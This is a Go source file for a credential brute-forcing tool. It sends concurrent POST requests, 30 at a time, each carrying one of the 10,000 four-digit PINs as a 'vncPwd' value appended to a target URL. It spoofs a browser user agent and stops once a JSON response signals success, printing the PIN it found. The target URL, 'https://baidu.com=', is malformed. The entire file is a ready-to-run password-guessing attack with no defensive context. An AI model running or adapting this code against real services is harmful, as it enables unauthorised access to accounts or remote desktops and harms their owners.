package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"encoding/json"
	"sync"
)

const (
	targetURL = "https://baidu.com="
	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
	threadNum = 30
)

var (
	mu   sync.Mutex
	stop bool
)

func checkPassword(vncPwd string, wg *sync.WaitGroup) {
	defer wg.Done()

	url := targetURL + vncPwd
	req, err := http.NewRequest("POST", url, nil)
	if err != nil {
		fmt.Printf("Failed to create request: %s\n", err)
		return
	}

	req.Header.Set("User-Agent", userAgent)
	client := http.DefaultClient
	response, err := client.Do(req)
	if err != nil {
		fmt.Printf("Failed to send request: %s\n", err)
		return
	}
	defer response.Body.Close()

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Println("Error reading the response body:", err)
		return
	}

	if response.StatusCode == http.StatusOK {
		var result map[string]interface{}
		if err := json.Unmarshal(body, &result); err != nil {
			fmt.Println("Error decoding JSON:", err)
			return
		}

		codeValue, codeExists := result["code"]
		if codeExists && codeValue == nil {
			fmt.Println("Code is null in the response.", "vncPwd: ", vncPwd, "Response Body:", string(body))
			mu.Lock()
			stop = true
			mu.Unlock()
		}
	}
}

func main() {
	var wg sync.WaitGroup

	for i := 0; i <= 9999; i++ {
		if stop {
			break
		}

		vncPwd := fmt.Sprintf("%04d", i)
		wg.Add(1)
		go checkPassword(vncPwd, &wg)

		// Limit the number of concurrent goroutines
		if i%threadNum == threadNum-1 {
			wg.Wait()
		}
	}

	// Wait for any remaining goroutines to finish
	wg.Wait()
}
